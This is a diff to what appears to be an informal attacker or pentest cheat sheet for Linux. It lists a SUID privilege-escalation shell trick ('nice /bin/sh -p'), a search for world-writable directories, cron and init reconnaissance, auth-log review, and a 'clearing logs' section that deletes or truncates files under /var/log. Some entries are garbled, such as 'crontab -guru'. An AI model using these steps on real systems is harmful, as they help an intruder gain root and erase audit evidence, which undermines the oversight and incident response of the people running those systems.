@@ -27,6 +27,7 @@ XXX ./nice /bin/sh -p
 (run this) nice /bin/sh -p (because u dont need the other ones foo)
 # ...... whatever u want my boy
 
+crontab -guru
 cat /etc/crontab
 sunday = 0 or 7
 crontab -e-l,-r,-u, 
@@ -35,7 +36,24 @@ ls -la /etc/cron.X
 
 find / -type d -perm /2 (write bit for others on) -ls 2>/dev/null
 
+figure out init type
+ls -latr /proc/1/exe
+stat /sbin/init
+man init
+init --version
+ps 1
 
+cat /var/log/auth.log | egrep -v "opened|closed"
+awk '/opened/' /var/log/auth.log
+last OR lastb OR lastlog
+strings OR dd            # for data files
+more /var/log/syslog
+head/tail
+
+clearing logs
+rm -rf /var/log/... (get rid of it)
+cat /dev/null > /var/log/... (clear)
+echo > /var/log/... (clear)
 
 
 
